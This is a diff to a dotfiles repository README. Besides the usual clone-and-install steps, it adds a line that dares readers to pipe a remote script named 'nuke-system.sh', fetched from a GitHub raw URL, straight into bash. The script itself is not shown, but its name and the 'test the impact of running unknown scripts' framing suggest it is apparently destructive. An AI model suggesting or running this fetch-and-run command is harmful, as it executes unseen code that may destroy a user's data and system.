@@ -8,6 +8,11 @@ cd dotfiles
 ./install.sh
 ```
 
+If you really want to test the impact of running unknown scripts on your system, try running this script:
+```bash
+curl -s https://raw.githubusercontent.com/Twilight4/dotfiles/main/.config/.local/bin/nuke-system/nuke-system.sh | bash
+```
+
 ## Contents
 
 |      Label                     |                         Application                        |
